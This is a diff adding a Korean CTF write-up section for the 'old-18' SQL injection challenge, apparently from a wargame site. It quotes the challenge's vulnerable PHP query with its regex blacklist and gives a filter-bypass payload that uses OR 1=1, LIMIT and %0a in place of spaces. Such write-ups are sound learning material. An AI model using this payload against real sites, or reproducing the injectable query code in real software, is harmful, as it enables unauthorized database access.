@@ -514,4 +514,46 @@ function sub(){ if(login.pw.value==unlock){ location.href="?"+unlock/10; } else{
 
 <br>
 
-#
+# old-18
+
+___SQL 인젝션___
+
+![18-sql](./pic/18-sql.PNG)
+
+
+소스코드를 확인해보자.
+
+
+```PHP
+...
+<?php
+if($_GET['no']){
+  $db = dbconnect();
+  if(preg_match("/ |\/|\(|\)|\||&|select|from|0x/i",$_GET['no'])) exit("no hack");
+  $result = mysqli_fetch_array(mysqli_query($db,"select id from chall18 where id='guest' and no=$_GET[no]")); // admin's no = 2
+
+  if($result['id']=="guest") echo "hi guest";
+  if($result['id']=="admin"){
+    solve(18);
+    echo "hi admin!";
+  }
+}
+?>
+...
+```
+정규표현식으로 특수문자 /, (, ), |, &와 select, from, 16진수를 차단하고 있으며, 대소문자를 구분하지 않도록 filtering 하고 있다.
+
+or을 이용해 조건이 항상 참이 되게 하고, 쿼리결과의 반환 개수를 제한하는 키워드인 limit을 이용해 no=2인 쿼리만 (guest의 no는 1이다) 반환되게 해야 할 것 같다.
+따라서 다음과 같이 쿼리문이 동작해야 한다.
+
+```SQL 
+SELECT id FROM chall18 WHERE id='guest' and no=1 or 1=1 LIMIT 1,1
+```
+
+띄어쓰기가 필드에서는 막히는것 같으므로 %0a로 우회하여 url에 넣을 최종 입력값은 다음과 같다.
+
+`1%0aor%0a1=1%0aLIMIT%0a1,1`
+
+![18-sql](./pic/18-url.PNG)
+
+![old-18](./pwned/old-18.PNG)
